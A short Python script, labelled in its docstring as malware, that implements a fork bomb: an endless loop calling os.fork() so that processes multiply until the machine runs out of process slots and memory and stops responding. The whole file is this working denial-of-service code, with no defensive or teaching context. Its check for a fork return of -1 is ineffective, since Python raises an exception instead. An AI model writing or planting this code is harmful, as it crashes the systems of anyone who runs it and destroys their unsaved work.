import os

"""
Be careful !!!!!!
It is a malware
"""

while True:
    pid = os.fork()
    if pid == -1:
        print("Error in fork")
